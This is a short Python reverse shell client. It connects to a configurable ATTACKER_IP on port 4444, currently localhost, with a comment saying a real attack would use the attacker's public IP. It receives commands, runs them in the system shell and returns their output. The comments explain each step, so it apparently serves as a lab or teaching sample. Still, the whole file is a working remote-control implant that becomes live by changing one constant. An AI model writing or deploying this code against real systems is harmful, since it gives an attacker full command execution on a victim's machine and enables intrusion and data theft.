import socket
import subprocess
import os

# In a real attack, this would be the Attacker's Public IP.
# For testing, we use localhost.
ATTACKER_IP = '127.0.0.1'
ATTACKER_PORT = 4444


def main():
    # 1. Connect to the Attacker
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print("[*] Connecting to attacker...")
    try:
        client.connect((ATTACKER_IP, ATTACKER_PORT))
        print("[+] Connected!")
    except ConnectionRefusedError:
        print("[-] Connection failed. Is the server running?")
        return

    # 2. Listen for commands
    while True:
        # Receive command from server
        command = client.recv(1024).decode()

        if command.lower() == 'exit':
            break

        # Handle "cd" command manually (subprocess doesn't persist directory changes)
        if command.startswith('cd '):
            try:
                os.chdir(command[3:])
                client.send(f"Changed directory to {os.getcwd()}".encode())
            except FileNotFoundError:
                client.send("Directory not found".encode())
            continue

        # 3. Execute the command
        # subprocess.run executes the command in the system shell
        # capture_output=True grabs what would be printed to the screen
        output = subprocess.run(command, shell=True, capture_output=True)

        # 4. Send result back
        # We send both Standard Output (stdout) and Error Output (stderr)
        response = output.stdout + output.stderr

        if not response:
            response = b"Command executed (No output)"

        client.send(response)

    client.close()


if __name__ == '__main__':
    main()